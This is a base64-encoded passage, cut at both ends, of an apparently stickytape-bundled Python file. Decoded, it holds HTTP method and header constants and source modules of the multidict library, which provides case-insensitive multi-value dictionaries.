VCJcclxuTUVUSF9ERUxFVEU6IEZpbmFsW3N0cl0gPSAiREVMRVRFIlxyXG5NRVRIX09QVElPTlM6IEZpbmFsW3N0cl0gPSAiT1BUSU9OUyJcclxuTUVUSF9QQVRDSDogRmluYWxbc3RyXSA9ICJQQVRDSCJcclxuTUVUSF9QT1NUOiBGaW5hbFtzdHJdID0gIlBPU1QiXHJcbk1FVEhfUFVUOiBGaW5hbFtzdHJdID0gIlBVVCJcclxuTUVUSF9UUkFDRTogRmluYWxbc3RyXSA9ICJUUkFDRSJcclxuXHJcbk1FVEhfQUxMOiBGaW5hbFtTZXRbc3RyXV0gPSB7XHJcbiAgICBNRVRIX0NPTk5FQ1QsXHJcbiAgICBNRVRIX0hFQUQsXHJcbiAgICBNRVRIX0dFVCxcclxuICAgIE1FVEhfREVMRVRFLFxyXG4gICAgTUVUSF9PUFRJT05TLFxyXG4gICAgTUVUSF9QQVRDSCxcclxuICAgIE1FVEhfUE9TVCxcclxuICAgIE1FVEhfUFVULFxyXG4gICAgTUVUSF9UUkFDRSxcclxufVxyXG5cclxuQUNDRVBUOiBGaW5hbFtpc3RyXSA9IGlzdHIoIkFjY2VwdCIpXHJcbkFDQ0VQVF9DSEFSU0VUOiBGaW5hbFtpc3RyXSA9IGlzdHIoIkFjY2VwdC1DaGFyc2V0IilcclxuQUNDRVBUX0VOQ09ESU5HOiBGaW5hbFtpc3RyXSA9IGlzdHIoIkFjY2VwdC1FbmNvZGluZyIpXHJcbkFDQ0VQVF9MQU5HVUFHRTogRmluYWxbaXN0cl0gPSBpc3RyKCJBY2NlcHQtTGFuZ3VhZ2UiKVxyXG5BQ0NFUFRfUkFOR0VTOiBGaW5hbFtpc3RyXSA9IGlzdHIoIkFjY2VwdC1SYW5nZXMiKVxyXG5BQ0NFU1NfQ09OVFJPTF9NQVhfQUdFOiBGaW5hbFtpc3RyXSA9IGlzdHIoIkFjY2Vzcy1Db250cm9sLU1heC1BZ2UiKVxyXG5BQ0NFU1NfQ09OVFJPTF9BTExPV19DUkVERU5USUFMUzogRmluYWxbaXN0cl0gPSBpc3RyKCJBY2Nlc3MtQ29udHJvbC1BbGxvdy1DcmVkZW50aWFscyIpXHJcbkFDQ0VTU19DT05UUk9MX0FMTE9XX0hFQURFUlM6IEZpbmFsW2lzdHJdID0gaXN0cigiQWNjZXNzLUNvbnRyb2wtQWxsb3ctSGVhZGVycyIpXHJcbkFDQ0VTU19DT05UUk9MX0FMTE9XX01FVEhPRFM6IEZpbmFsW2lzdHJdID0gaXN0cigiQWNjZXNzLUNvbnRyb2wtQWxsb3ctTWV0aG9kcyIpXHJcbkFDQ0VTU19DT05UUk9MX0FMTE9XX09SSUdJTjogRmluYWxbaXN0cl0gPSBpc3RyKCJBY2Nlc3MtQ29udHJvbC1BbGxvdy1PcmlnaW4iKVxyXG5BQ0NFU1NfQ09OVFJPTF9FWFBPU0VfSEVBREVSUzogRmluYWxbaXN0cl0gPSBpc3RyKCJBY2Nlc3MtQ29udHJvbC1FeHBvc2UtSGVhZGVycyIpXHJcbkFDQ0VTU19DT05UUk9MX1JFUVVFU1RfSEVBREVSUzogRmluYWxbaXN0cl0gPSBpc3RyKCJBY2Nlc3MtQ29udHJvbC1SZXF1ZXN0LUhlYWRlcnMiKVxyXG5BQ0NFU1NfQ09OVFJPTF9SRVFVRVNUX01FVEhPRDogRmluYWxbaXN0cl0gPSBpc3RyKCJBY2Nlc3MtQ29udHJvbC1SZXF1ZXN0LU1ldGhvZCIpXHJcbkFHRTogRmluYWxbaXN0cl0gPSBpc3RyKCJBZ2UiKVxyXG5BTExPVzogRmluYWxbaXN0cl0gPSBpc3RyKCJBbGxvdyIpXHJcbkFVVEhPUklaQVRJT046IEZpbmFsW2lzdHJdID0gaXN0cigiQXV0aG9yaXphdGlvbiIpXHJcbkNBQ0hFX0NPTlRST0w6IEZpbmFsW2lzdHJdID0gaXN0cigiQ2FjaGUtQ29udHJvbCIpXHJcbkNPTk5FQ1RJT046IEZpbmFsW2lzdHJdID0gaXN0cigiQ29ubmVjdGlvbiIpXHJcbkNPTlRFTlRfRElTUE9TSVRJT046IEZpbmFsW2lzdHJdID0gaXN0cigiQ29udGVudC1EaXNwb3NpdGlvbiIpXHJcbkNPTlRFTlRfRU5DT0RJTkc6IEZpbmFsW2lzdHJdID0gaXN0cigiQ29udGVudC1FbmNvZGluZyIpXHJcbkNPTlRFTlRfTEFOR1VBR0U6IEZpbmFsW2lzdHJdID0gaXN0cigiQ29udGVudC1MYW5ndWFnZSIpXHJcbkNPTlRFTlRfTEVOR1RIOiBGaW5hbFtpc3RyXSA9IGlzdHIoIkNvbnRlbnQtTGVuZ3RoIilcclxuQ09OVEVOVF9MT0NBVElPTjogRmluYWxbaXN0cl0gPSBpc3RyKCJDb250ZW50LUxvY2F0aW9uIilcclxuQ09OVEVOVF9NRDU6IEZpbmFsW2lzdHJdID0gaXN0cigiQ29udGVudC1NRDUiKVxyXG5DT05URU5UX1JBTkdFOiBGaW5hbFtpc3RyXSA9IGlzdHIoIkNvbnRlbnQtUmFuZ2UiKVxyXG5DT05URU5UX1RSQU5TRkVSX0VOQ09ESU5HOiBGaW5hbFtpc3RyXSA9IGlzdHIoIkNvbnRlbnQtVHJhbnNmZXItRW5jb2RpbmciKVxyXG5DT05URU5UX1RZUEU6IEZpbmFsW2lzdHJdID0gaXN0cigiQ29udGVudC1UeXBlIilcclxuQ09PS0lFOiBGaW5hbFtpc3RyXSA9IGlzdHIoIkNvb2tpZSIpXHJcbkRBVEU6IEZpbmFsW2lzdHJdID0gaXN0cigiRGF0ZSIpXHJcbkRFU1RJTkFUSU9OOiBGaW5hbFtpc3RyXSA9IGlzdHIoIkRlc3RpbmF0aW9uIilcclxuRElHRVNUOiBGaW5hbFtpc3RyXSA9IGlzdHIoIkRpZ2VzdCIpXHJcbkVUQUc6IEZpbmFsW2lzdHJdID0gaXN0cigiRXRhZyIpXHJcbkVYUEVDVDogRmluYWxbaXN0cl0gPSBpc3RyKCJFeHBlY3QiKVxyXG5FWFBJUkVTOiBGaW5hbFtpc3RyXSA9IGlzdHIoIkV4cGlyZXMiKVxyXG5GT1JXQVJERUQ6IEZpbmFsW2lzdHJdID0gaXN0cigiRm9yd2FyZGVkIilcclxuRlJPTTogRmluYWxbaXN0cl0gPSBpc3RyKCJGcm9tIilcclxuSE9TVDogRmluYWxbaXN0cl0gPSBpc3RyKCJIb3N0IilcclxuSUZfTUFUQ0g6IEZpbmFsW2lzdHJdID0gaXN0cigiSWYtTWF0Y2giKVxyXG5JRl9NT0RJRklFRF9TSU5DRTogRmluYWxbaXN0cl0gPSBpc3RyKCJJZi1Nb2RpZmllZC1TaW5jZSIpXHJcbklGX05PTkVfTUFUQ0g6IEZpbmFsW2lzdHJdID0gaXN0cigiSWYtTm9uZS1NYXRjaCIpXHJcbklGX1JBTkdFOiBGaW5hbFtpc3RyXSA9IGlzdHIoIklmLVJhbmdlIilcclxuSUZfVU5NT0RJRklFRF9TSU5DRTogRmluYWxbaXN0cl0gPSBpc3RyKCJJZi1Vbm1vZGlmaWVkLVNpbmNlIilcclxuS0VFUF9BTElWRTogRmluYWxbaXN0cl0gPSBpc3RyKCJLZWVwLUFsaXZlIilcclxuTEFTVF9FVkVOVF9JRDogRmluYWxbaXN0cl0gPSBpc3RyKCJMYXN0LUV2ZW50LUlEIilcclxuTEFTVF9NT0RJRklFRDogRmluYWxbaXN0cl0gPSBpc3RyKCJMYXN0LU1vZGlmaWVkIilcclxuTElOSzogRmluYWxbaXN0cl0gPSBpc3RyKCJMaW5rIilcclxuTE9DQVRJT046IEZpbmFsW2lzdHJdID0gaXN0cigiTG9jYXRpb24iKVxyXG5NQVhfRk9SV0FSRFM6IEZpbmFsW2lzdHJdID0gaXN0cigiTWF4LUZvcndhcmRzIilcclxuT1JJR0lOOiBGaW5hbFtpc3RyXSA9IGlzdHIoIk9yaWdpbiIpXHJcblBSQUdNQTogRmluYWxbaXN0cl0gPSBpc3RyKCJQcmFnbWEiKVxyXG5QUk9YWV9BVVRIRU5USUNBVEU6IEZpbmFsW2lzdHJdID0gaXN0cigiUHJveHktQXV0aGVudGljYXRlIilcclxuUFJPWFlfQVVUSE9SSVpBVElPTjogRmluYWxbaXN0cl0gPSBpc3RyKCJQcm94eS1BdXRob3JpemF0aW9uIilcclxuUkFOR0U6IEZpbmFsW2lzdHJdID0gaXN0cigiUmFuZ2UiKVxyXG5SRUZFUkVSOiBGaW5hbFtpc3RyXSA9IGlzdHIoIlJlZmVyZXIiKVxyXG5SRVRSWV9BRlRFUjogRmluYWxbaXN0cl0gPSBpc3RyKCJSZXRyeS1BZnRlciIpXHJcblNFQ19XRUJTT0NLRVRfQUNDRVBUOiBGaW5hbFtpc3RyXSA9IGlzdHIoIlNlYy1XZWJTb2NrZXQtQWNjZXB0IilcclxuU0VDX1dFQlNPQ0tFVF9WRVJTSU9OOiBGaW5hbFtpc3RyXSA9IGlzdHIoIlNlYy1XZWJTb2NrZXQtVmVyc2lvbiIpXHJcblNFQ19XRUJTT0NLRVRfUFJPVE9DT0w6IEZpbmFsW2lzdHJdID0gaXN0cigiU2VjLVdlYlNvY2tldC1Qcm90b2NvbCIpXHJcblNFQ19XRUJTT0NLRVRfRVhURU5TSU9OUzogRmluYWxbaXN0cl0gPSBpc3RyKCJTZWMtV2ViU29ja2V0LUV4dGVuc2lvbnMiKVxyXG5TRUNfV0VCU09DS0VUX0tFWTogRmluYWxbaXN0cl0gPSBpc3RyKCJTZWMtV2ViU29ja2V0LUtleSIpXHJcblNFQ19XRUJTT0NLRVRfS0VZMTogRmluYWxbaXN0cl0gPSBpc3RyKCJTZWMtV2ViU29ja2V0LUtleTEiKVxyXG5TRVJWRVI6IEZpbmFsW2lzdHJdID0gaXN0cigiU2VydmVyIilcclxuU0VUX0NPT0tJRTogRmluYWxbaXN0cl0gPSBpc3RyKCJTZXQtQ29va2llIilcclxuVEU6IEZpbmFsW2lzdHJdID0gaXN0cigiVEUiKVxyXG5UUkFJTEVSOiBGaW5hbFtpc3RyXSA9IGlzdHIoIlRyYWlsZXIiKVxyXG5UUkFOU0ZFUl9FTkNPRElORzogRmluYWxbaXN0cl0gPSBpc3RyKCJUcmFuc2Zlci1FbmNvZGluZyIpXHJcblVQR1JBREU6IEZpbmFsW2lzdHJdID0gaXN0cigiVXBncmFkZSIpXHJcblVSSTogRmluYWxbaXN0cl0gPSBpc3RyKCJVUkkiKVxyXG5VU0VSX0FHRU5UOiBGaW5hbFtpc3RyXSA9IGlzdHIoIlVzZXItQWdlbnQiKVxyXG5WQVJZOiBGaW5hbFtpc3RyXSA9IGlzdHIoIlZhcnkiKVxyXG5WSUE6IEZpbmFsW2lzdHJdID0gaXN0cigiVmlhIilcclxuV0FOVF9ESUdFU1Q6IEZpbmFsW2lzdHJdID0gaXN0cigiV2FudC1EaWdlc3QiKVxyXG5XQVJOSU5HOiBGaW5hbFtpc3RyXSA9IGlzdHIoIldhcm5pbmciKVxyXG5XV1dfQVVUSEVOVElDQVRFOiBGaW5hbFtpc3RyXSA9IGlzdHIoIldXVy1BdXRoZW50aWNhdGUiKVxyXG5YX0ZPUldBUkRFRF9GT1I6IEZpbmFsW2lzdHJdID0gaXN0cigiWC1Gb3J3YXJkZWQtRm9yIilcclxuWF9GT1JXQVJERURfSE9TVDogRmluYWxbaXN0cl0gPSBpc3RyKCJYLUZvcndhcmRlZC1Ib3N0IilcclxuWF9GT1JXQVJERURfUFJPVE86IEZpbmFsW2lzdHJdID0gaXN0cigiWC1Gb3J3YXJkZWQtUHJvdG8iKVxyXG4nKQogICAgX19zdGlja3l0YXBlX3dyaXRlX21vZHVsZSgnbXVsdGlkaWN0L19faW5pdF9fLnB5JywgYiciIiJNdWx0aWRpY3QgaW1wbGVtZW50YXRpb24uXHJcblxyXG5IVFRQIEhlYWRlcnMgYW5kIFVSTCBxdWVyeSBzdHJpbmcgcmVxdWlyZSBzcGVjaWZpYyBkYXRhIHN0cnVjdHVyZTpcclxubXVsdGlkaWN0LiBJdCBiZWhhdmVzIG1vc3RseSBsaWtlIGEgZGljdCBidXQgaXQgY2FuIGhhdmVcclxuc2V2ZXJhbCB2YWx1ZXMgZm9yIHRoZSBzYW1lIGtleS5cclxuIiIiXHJcblxyXG5mcm9tIC5fYWJjIGltcG9ydCBNdWx0aU1hcHBpbmcsIE11dGFibGVNdWx0aU1hcHBpbmdcclxuZnJvbSAuX2NvbXBhdCBpbXBvcnQgVVNFX0VYVEVOU0lPTlNcclxuXHJcbl9fYWxsX18gPSAoXHJcbiAgICAiTXVsdGlNYXBwaW5nIixcclxuICAgICJNdXRhYmxlTXVsdGlNYXBwaW5nIixcclxuICAgICJNdWx0aURpY3RQcm94eSIsXHJcbiAgICAiQ0lNdWx0aURpY3RQcm94eSIsXHJcbiAgICAiTXVsdGlEaWN0IixcclxuICAgICJDSU11bHRpRGljdCIsXHJcbiAgICAidXBzdHIiLFxyXG4gICAgImlzdHIiLFxyXG4gICAgImdldHZlcnNpb24iLFxyXG4pXHJcblxyXG5fX3ZlcnNpb25fXyA9ICI2LjAuMiJcclxuXHJcblxyXG50cnk6XHJcbiAgICBpZiBub3QgVVNFX0VYVEVOU0lPTlM6XHJcbiAgICAgICAgcmFpc2UgSW1wb3J0RXJyb3JcclxuICAgIGZyb20gLl9tdWx0aWRpY3QgaW1wb3J0IChcclxuICAgICAgICBDSU11bHRpRGljdCxcclxuICAgICAgICBDSU11bHRpRGljdFByb3h5LFxyXG4gICAgICAgIE11bHRpRGljdCxcclxuICAgICAgICBNdWx0aURpY3RQcm94eSxcclxuICAgICAgICBnZXR2ZXJzaW9uLFxyXG4gICAgICAgIGlzdHIsXHJcbiAgICApXHJcbmV4Y2VwdCBJbXBvcnRFcnJvcjogICMgcHJhZ21hOiBubyBjb3ZlclxyXG4gICAgZnJvbSAuX211bHRpZGljdF9weSBpbXBvcnQgKFxyXG4gICAgICAgIENJTXVsdGlEaWN0LFxyXG4gICAgICAgIENJTXVsdGlEaWN0UHJveHksXHJcbiAgICAgICAgTXVsdGlEaWN0LFxyXG4gICAgICAgIE11bHRpRGljdFByb3h5LFxyXG4gICAgICAgIGdldHZlcnNpb24sXHJcbiAgICAgICAgaXN0cixcclxuICAgIClcclxuXHJcblxyXG51cHN0ciA9IGlzdHJcclxuJykKICAgIF9fc3RpY2t5dGFwZV93cml0ZV9tb2R1bGUoJ211bHRpZGljdC9fYWJjLnB5JywgYidpbXBvcnQgYWJjXHJcbmltcG9ydCBzeXNcclxuaW1wb3J0IHR5cGVzXHJcbmZyb20gY29sbGVjdGlvbnMuYWJjIGltcG9ydCBNYXBwaW5nLCBNdXRhYmxlTWFwcGluZ1xyXG5cclxuXHJcbmNsYXNzIF9UeXBpbmdNZXRhKGFiYy5BQkNNZXRhKTpcclxuICAgICMgQSBmYWtlIG1ldGFjbGFzcyB0byBzYXRpc2Z5IHR5cGluZyBkZXBzIGluIHJ1bnRpbWVcclxuICAgICMgYmFzaWNhbGx5IE11bHRpTWFwcGluZ1tzdHJdIGFuZCBvdGhlciBnZW5lcmljLWxpa2UgdHlwZSBpbnN0YW50aWF0aW9uc1xyXG4gICAgIyBhcmUgZW11bGF0ZWQuXHJcbiAgICAjIE5vdGU6IHJlYWwgdHlwZSBoaW50cyBhcmUgcHJvdmlkZWQgYnkgX19pbml0X18ucHlpIHN0dWIgZmlsZVxyXG4gICAgaWYgc3lzLnZlcnNpb25faW5mbyA+PSAoMywgOSk6XHJcblxyXG4gICAgICAgIGRlZiBfX2dldGl0ZW1fXyhzZWxmLCBrZXkpOlxyXG4gICAgICAgICAgICByZXR1cm4gdHlwZXMuR2VuZXJpY0FsaWFzKHNlbGYsIGtleSlcclxuXHJcbiAgICBlbHNlOlxyXG5cclxuICAgICAgICBkZWYgX19nZXRpdGVtX18oc2VsZiwga2V5KTpcclxuICAgICAgICAgICAgcmV0dXJuIHNlbGZcclxuXHJcblxyXG5jbGFzcyBNdWx0aU1hcHBpbmcoTWFwcGluZywgbWV0YWNsYXNzPV9UeXBpbmdNZXRhKTpcclxuICAgIEBhYmMuYWJzdHJhY3RtZXRob2RcclxuICAgIGRlZiBnZXRhbGwoc2VsZiwga2V5LCBkZWZhdWx0PU5vbmUpOlxyXG4gICAgICAgIHJhaXNlIEtleUVycm9yXHJcblxyXG4gICAgQGFiYy5hYnN0cmFjdG1ldGhvZFxyXG4gICAgZGVmIGdldG9uZShzZWxmLCBrZXksIGRlZmF1bHQ9Tm9uZSk6XHJcbiAgICAgICAgcmFpc2UgS2V5RXJyb3JcclxuXHJcblxyXG5jbGFzcyBNdXRhYmxlTXVsdGlNYXBwaW5nKE11bHRpTWFwcGluZywgTXV0YWJsZU1hcHBpbmcpOlxyXG4gICAgQGFiYy5hYnN0cmFjdG1ldGhvZFxyXG4gICAgZGVmIGFkZChzZWxmLCBrZXksIHZhbHVlKTpcclxuICAgICAgICByYWlzZSBOb3RJbXBsZW1lbnRlZEVycm9yXHJcblxyXG4gICAgQGFiYy5hYnN0cmFjdG1ldGhvZFxyXG4gICAgZGVmIGV4dGVuZChzZWxmLCAqYXJncywgKiprd2FyZ3MpOlxyXG4gICAgICAgIHJhaXNlIE5vdEltcGxlbWVudGVkRXJyb3JcclxuXHJcbiAgICBAYWJjLmFic3RyYWN0bWV0aG9kXHJcbiAgICBkZWYgcG9wb25lKHNlbGYsIGtleSwgZGVmYXVsdD1Ob25lKTpcclxuICAgICAgICByYWlzZSBLZXlFcnJvclxyXG5cclxuICAgIEBhYmMuYWJzdHJhY3RtZXRob2RcclxuICAgIGRlZiBwb3BhbGwoc2VsZiwga2V5LCBkZWZhdWx0PU5vbmUpOlxyXG4gICAgICAgIHJhaXNlIEtleUVycm9yXHJcbicpCiAgICBfX3N0aWNreXRhcGVfd3JpdGVfbW9kdWxlKCdtdWx0aWRpY3QvX2NvbXBhdC5weScsIGInaW1wb3J0IG9zXHJcbmltcG9ydCBwbGF0Zm9ybVxyXG5cclxuTk9fRVhURU5TSU9OUyA9IGJvb2wob3MuZW52aXJvbi5nZXQoIk1VTFRJRElDVF9OT19FWFRFTlNJT05TIikpXHJcblxyXG5QWVBZID0gcGxhdGZvcm0ucHl0aG9uX2ltcGxlbWVudGF0aW9uKCkgPT0gIlB5UHkiXHJcblxyXG5VU0VfRVhURU5TSU9OUyA9IG5vdCBOT19FWFRFTlNJT05TIGFuZCBub3QgUFlQWVxyXG5cclxuaWYgVVNFX0VYVEVOU0lPTlM6XHJcbiAgICB0cnk6XHJcbiAgICAgICAgZnJvbSAuIGltcG9ydCBfbXVsdGlkaWN0ICAjIG5vcWFcclxuICAgIGV4Y2VwdCBJbXBvcnRFcnJvcjpcclxuICAgICAgICBVU0VfRVhURU5TSU9OUyA9IEZhbHNlXHJcbicpCiAgICBfX3N0aWNreXRhcGVfd3JpdGVfbW9kdWxlKCdtdWx0aWRpY3QvX211bHRpZGljdF9weS5weScsIGInaW1wb3J0IHN5c1xyXG5pbXBvcnQgdHlwZXNcclxuZnJvbSBhcnJheSBpbXBvcnQgYXJyYXlcclxuZnJvbSBjb2xsZWN0aW9ucyBpbXBvcnQgYWJjXHJcblxyXG5mcm9tIC5fYWJjIGltcG9ydCBNdWx0aU1hcHBpbmcsIE11dGFibGVNdWx0aU1hcHBpbmdcclxuXHJcbl9tYXJrZXIgPSBvYmplY3QoKVxyXG5cclxuaWYgc3lzLnZlcnNpb25faW5mbyA+PSAoMywgOSk6XHJcbiAgICBHZW5lcmljQWxpYXMgPSB0eXBlcy5HZW5lcmljQWxpYXNcclxuZWxzZTpcclxuICAgIGRlZiBHZW5lcmljQWxpYXMoY2xzKTpcclxuICAgICAgICByZXR1cm4gY2xzXHJcblxyXG5cclxuY2xhc3MgaXN0cihzdHIpOlxyXG5cclxuICAgICIiIkNhc2UgaW5zZW5zaXRpdmUgc3RyLiIiIlxyXG5cclxuICAgIF9faXNfaXN0cl9fID0gVHJ1ZVxyXG5cclxuXHJcbnVwc3RyID0gaXN0ciAgIyBmb3IgcmVsYXhpbmcgYmFja3dhcmQgY29tcGF0aWJpbGl0eSBwcm9ibGVtc1xyXG5cclxuXHJcbmRlZiBnZXR2ZXJzaW9uKG1kKTpcclxuICAgIGlmIG5vdCBpc2luc3RhbmNlKG1kLCBfQmFzZSk6XHJcbiAgICAgICAgcmFpc2UgVHlwZUVycm9yKCJQYXJhbWV0ZXIgc2hvdWxkIGJlIG11bHRpZGljdCBvciBwcm94eSIpXHJcbiAgICByZXR1cm4gbWQuX2ltcGwuX3ZlcnNpb25cclxuXHJcblxyXG5fdmVyc2lvbiA9IGFycmF5KCJRIiwgWzBdKVxyXG5cclxuXHJcbmNsYXNzIF9JbXBsOlxyXG4gICAgX19zbG90c19fID0gKCJfaXRlbXMiLCAiX3ZlcnNpb24iKVxyXG5cclxuICAgIGRlZiBfX2luaXRfXyhzZWxmKTpcclxuICAgICAgICBzZWxmLl9pdGVtcyA9IFtdXHJcbiAgICAgICAgc2VsZi5pbmNyX3ZlcnNpb24oKVxyXG5cclxuICAgIGRlZiBpbmNyX3ZlcnNpb24oc2VsZik6XHJcbiAgICAgICAgZ2xvYmFsIF92ZXJzaW9uXHJcbiAgICAgICAgdiA9IF92ZXJzaW9uXHJcbiAgICAgICAgdlswXSArPSAxXHJcbiAgICAgICAgc2VsZi5fdmVyc2lvbiA9IHZbMF1cclxuXHJcbiAgICBpZiBzeXMuaW1wbGVtZW50YXRpb24ubmFtZSAhPSAicHlweSI6XHJcblxyXG4gICAgICAgIGRlZiBfX3NpemVvZl9fKHNlbGYpOlxyXG4gICAgICAgICAgICByZXR1cm4gb2JqZWN0Ll9fc2l6ZW9mX18oc2VsZikgKyBzeXMuZ2V0c2l6ZW9mKHNlbGYuX2l0ZW1zKVxyXG5cclxuXHJcbmNsYXNzIF9CYXNlOlxyXG4gICAgZGVmIF90aXRsZShzZWxmLCBrZXkpOlxyXG4gICAgICAgIHJldHVybiBrZXlcclxuXHJcbiAgICBkZWYgZ2V0YWxsKHNlbGYsIGtleSwgZGVmYXVsdD1fbWFya2VyKTpcclxuICAgICAgICAiIiJSZXR1cm4gYSBsaXN0IG9mIGFsbCB2YWx1ZXMgbWF0Y2hpbmcgdGhlIGtleS4iIiJcclxuICAgICAgICBpZGVudGl0eSA9IHNlbGYuX3RpdGxlKGtleSlcclxuICAgICAgICByZXMgPSBbdiBmb3IgaSwgaywgdiBpbiBzZWxmLl9pbXBsLl9pdGVtcyBpZiBpID09IGlkZW50aXR5XVxyXG4gICAgICAgIGlmIHJlczpcclxuICAgICAgICAgICAgcmV0dXJuIHJlc1xyXG4gICAgICAgIGlmIG5vdCByZXMgYW5kIGRlZmF1bHQgaXMgbm90IF9tYXJrZXI6XHJcbiAgICAgICAgICAgIHJldHVybiBkZWZhdWx0XHJcbiAgICAgICAgcmFpc2UgS2V5RXJyb3IoIktleSBub3QgZm91bmQ6ICVyIiAlIGtleSlcclxuXHJcbiAgICBkZWYgZ2V0b25lKHNlbGYsIGtleSwgZGVmYXVsdD1fbWFya2VyKTpcclxuICAgICAgICAiIiJHZXQgZmlyc3QgdmFsdWUgbWF0Y2hpbmcgdGhlIGtleS4iIiJcclxuICAgICAgICBpZGVudGl0eSA9IHNlbGYuX3RpdGxlKGtleSlcclxuICAgICAgICBmb3IgaSwgaywgdiBpbiBzZWxmLl9pbXBsLl9pdGVtczpcclxuICAgICAgICAgICAgaWYgaSA9PSBpZGVudGl0eTpcclxuICAgICAgICAgICAgICAgIHJldHVybiB2XHJcbiAgICAgICAgaWYgZGVmYXVsdCBpcyBub3QgX21hcmtlcjpcclxuICAgICAgICAgICAgcmV0dXJuIGRlZmF1bHRcclxuICAgICAgICByYWlzZSBLZXlFcnJvcigiS2V5IG5vdCBmb3VuZDogJXIiICUga2V5KVxyXG5cclxuICAgICMgTWFwcGluZyBpbnRlcmZhY2UgI1xyXG5cclxuICAgIGRlZiBfX2dldGl0ZW1fXyhzZWxmLCBrZXkpOlxyXG4gICAgICAgIHJldHVybiBzZWxmLmdldG9uZShrZXkpXHJcblxyXG4gICAgZGVmIGdldChzZWxmLCBrZXksIGRlZmF1bHQ9Tm9uZSk6XHJcbiAgICAgICAgIiIiR2V0IGZpcnN0IHZhbHVlIG1hdGNoaW5nIHRoZSBrZXkuIiIiXHJcbiAgICAgICAgcmV0dXJuIHNlbGYuZ2V0b25lKGtleSwgZGVmYXVsdClcclxuXHJcbiAgICBkZWYgX19pdGVyX18oc2VsZik6XHJcbiAgICAgICAgcmV0dXJuIGl0ZXIoc2VsZi5rZXlzKCkpXHJcblxyXG4gICAgZGVmIF9fbGVuX18oc2VsZik6XHJcbiAgICAgICAgcmV0dXJuIGxlbihzZWxmLl9pbXBsLl9pdGVtcylcclxuXHJcbiAgICBkZWYga2V5cyhzZWxmKTpcclxuICAgICAgICAiIiJSZXR1cm4gYSBuZXcgdmlldyBvZiB0aGUgZGljdGlvbmFyeVwncyBrZXlzLiIiIlxyXG4gICAgICAgIHJldHVybiBfS2V5c1ZpZXcoc2VsZi5faW1wbClcclxuXHJcbiAgICBkZWYgaXRlbXMoc2VsZik6XHJcbiAgICAgICAgIiIiUmV0dXJuIGEgbmV3IHZpZXcgb2YgdGhlIGRpY3Rpb25hcnlcJ3MgaXRlbXMgKihrZXksIHZhbHVlKSBwYWlycykuIiIiXHJcbiAgICAgICAgcmV0dXJuIF9JdGVtc1ZpZXcoc2VsZi5faW1wbClcclxuXHJcbiAgICBkZWYgdmFsdWVzKHNlbGYpOlxyXG4gICAgICAgICIiIlJldHVybiBhIG5ldyB2aWV3IG9mIHRoZSBkaWN0aW9uYXJ5XCdzIHZhbHVlcy4iIiJcclxuICAgICAgICByZXR1cm4gX1ZhbHVlc1ZpZXcoc2VsZi5faW1wbClcclxuXHJcbiAgICBkZWYgX19lcV9fKHNlbGYsIG90aGVyKTpcclxuICAgICAgICBpZiBub3QgaXNpbnN0YW5jZShvdGhlciwgYWJjLk1hcHBpbmcpOlxyXG4gICAgICAgICAgICByZXR1cm4gTm90SW1wbGVtZW50ZWRcclxuICAgICAgICBpZiBpc2luc3RhbmNlKG90aGVyLCBfQmFzZSk6XHJcbiAgICAgICAgICAgIGxmdCA9IHNlbGYuX2ltcGwuX2l0ZW1zXHJcbiAgICAgICAgICAgIHJodCA9IG90aGVyLl9pbXBsLl9pdGVtc1xyXG4gICAgICAgICAgICBpZiBsZW4obGZ0KSAhPSBsZW4ocmh0KTpcclxuICAgICAgICAgICAgICAgIHJldHVybiBGYWxzZVxyXG4gICAgICAgICAgICBmb3IgKGkxLCBrMiwgdjEpLCAoaTIsIGsyLCB2MikgaW4gemlwKGxmdCwgcmh0KTpcclxuICAgICAgICAgICAgICAgIGlmIGkxICE9IGkyIG9yIHYxICE9IHYyOlxyXG4gICAgICAgICAgICAgICAgICAgIHJldHVybiBGYWxzZVxyXG4gICAgICAgICAgICByZXR1cm4gVHJ1ZVxyXG4gICAgICAgIGlmIGxlbihzZWxmLl9pbXBsLl9pdGVtcykgIT0gbGVuKG90aGVyKTpcclxuICAgICAgICAgICAgcmV0dXJuIEZhbHNlXHJcbiAgICAgICAgZm9yIGssIHYgaW4gc2VsZi5pdGVtcygpOlxyXG4gICAgICAgICAgICBudiA9IG90aGVyLmdldChrLCBfbWFya2VyKVxyXG4gICAgICAgICAgICBpZiB2ICE9IG52OlxyXG4gICAgICAgICAgICAgICAgcmV0dXJuIEZhbHNlXHJcbiAgICAgICAgcmV0dXJuIFRydWVcclxuXHJcbiAgICBkZWYgX19jb250YWluc19fKHNlbGYsIGtleSk6XHJcbiAgICAgICAgaWRlbnRpdHkgPSBzZWxmLl90aXRsZShrZXkpXHJcbiAgICAgICAgZm9yIGksIGssIHYgaW4gc2VsZi5faW1wbC5faXRlbXM6XHJcbiAgICAgICAgICAgIGlmIGkgPT0gaWRlbnRpdHk6XHJcbiAgICAgICAgICAgICAgICByZXR1cm4gVHJ1ZVxyXG4gICAgICAgIHJldHVybiBGYWxzZVxyXG5cclxuICAgIGRlZiBfX3JlcHJfXyhzZWxmKTpcclxuICAgICAgICBib2R5ID0gIiwgIi5qb2luKCJcJ3t9XCc6IHshcn0iLmZvcm1hdChrLCB2KSBmb3IgaywgdiBpbiBzZWxmLml0ZW1zKCkpXHJcbiAgICAgICAgcmV0dXJuICI8e30oe30pPiIuZm9ybWF0KHNlbGYuX19jbGFzc19fLl9fbmFtZV9fLCBib2R5KVxyXG5cclxuICAgIF9fY2xhc3NfZ2V0aXRlbV9fID0gY2xhc3NtZXRob2QoR2VuZXJpY0FsaWFzKVxyXG5cclxuXHJcbmNsYXNzIE11bHRpRGljdFByb3h5KF9CYXNlLCBNdWx0aU1hcHBpbmcpOlxyXG4gICAgIiIiUmVhZC1vbmx5IHByb3h5IGZvciBNdWx0aURpY3QgaW5zdGFuY2UuIiIiXHJcblxyXG4gICAgZGVmIF9faW5pdF9fKHNlbGYsIGFyZyk6XHJcbiAgICAgICAgaWYgbm90IGlzaW5zdGFuY2UoYXJnLCAoTXVsdGlEaWN0LCBNdWx0aURpY3RQcm94eSkpOlxyXG4gICAgICAgICAgICByYWlzZSBUeXBlRXJyb3IoXHJcbiAgICAgICAgICAgICAgICAiY3RvciByZXF1aXJlcyBNdWx0aURpY3Qgb3IgTXVsdGlEaWN0UHJveHkgaW5zdGFuY2UiXHJcbiAgICAgICAgICAgICAgICAiLCBub3Qge30iLmZvcm1hdCh0eXBlKGFyZykpXHJcbiAgICAgICAgICAgIClcclxuXHJcbiAgICAgICAgc2VsZi5faW1wbCA9IGFyZy5faW1wbFxyXG5cclxuICAgIGRlZiBfX3JlZHVjZV9fKHNlbGYpOlxyXG4gICAgICA